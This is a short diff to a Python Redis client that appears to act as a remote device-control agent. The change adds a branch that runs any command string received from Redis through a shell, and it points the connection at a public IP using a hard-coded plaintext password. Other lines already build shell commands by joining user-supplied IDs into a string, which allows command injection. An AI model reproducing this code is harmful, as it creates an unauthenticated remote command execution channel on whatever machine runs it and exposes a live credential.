@@ -1,7 +1,7 @@
 import redis
 import json
 import time
-import os
+import subprocess
 
 MAC = None
 
@@ -74,11 +74,14 @@ def process(mac0, data):
                     elif operate == "shutdown":
                         cmd = "python3 ./operate-script/shutdown.py " + userid + " " + id
                         subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
+                elif type=="others":
+                    cmd = data['operate']
+                    subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
     except Exception as e:
         print(e)
 
 if __name__ == '__main__':
-    pool = redis.ConnectionPool(host='192.168.0.69', port='6379', db=0, password='sjdtwigkvsmdsjfkgiw23usfvmkj2')
+    pool = redis.ConnectionPool(host='47.106.253.159', port='6379', db=0, password='sjdtwigkvsmdsjfkgiw23usfvmkj2')
     conn = redis.Redis(connection_pool=pool)
     if MAC is None:
         MAC = getMac()
